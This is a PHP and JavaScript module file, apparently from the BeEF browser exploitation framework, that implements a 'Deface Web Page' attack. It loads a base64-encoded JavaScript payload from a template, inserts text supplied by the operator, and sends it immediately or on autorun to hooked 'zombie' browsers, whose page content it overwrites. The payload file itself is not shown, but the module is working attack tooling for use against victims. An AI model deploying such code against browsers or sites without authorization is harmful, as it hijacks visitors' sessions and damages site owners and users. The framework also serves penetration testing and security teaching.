<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>

	function get_b64_code_deface() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "HTMLCONTENT", document.myform.deface_str.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Deface Web Page', get_b64_code_deface());
	}

	Element.Methods.send_now = function() {
		do_send(get_b64_code_deface());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Deface Web Page</div>
This module will overwrite the content of the selected zombies with the value entered in the
'Deface String' input. <br><br>
<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Deface String</div>
		<input type="text" name="deface_str" value="BeEF Deface Web Page"/>		
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>	
	</form>
</div>
